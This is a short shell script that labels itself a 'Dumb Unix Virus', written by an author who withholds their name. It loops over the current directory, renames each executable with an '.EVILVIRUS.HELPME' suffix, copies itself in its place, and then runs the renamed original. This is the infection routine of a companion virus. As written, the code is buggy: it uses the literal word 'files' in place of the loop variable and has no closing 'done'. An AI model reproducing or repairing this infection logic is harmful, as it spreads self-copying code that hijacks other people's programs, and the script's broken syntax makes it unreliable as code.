#!/bin/sh
# Dumb Unix Virus
# I dont wanna write anutha dumb unix virus qark, i wont
# Due to excess lameness, dont distribute
# <Author's name withheld for obvious reasons>
for files in *
do
 if [ -x files ]
 then
     if [ ! -d files ]
     then
       mv files files.EVILVIRUS.HELPME
       cp $0 files
       chmod +x files
       files.EVILVIRUS.HELPME
     fi
   fi
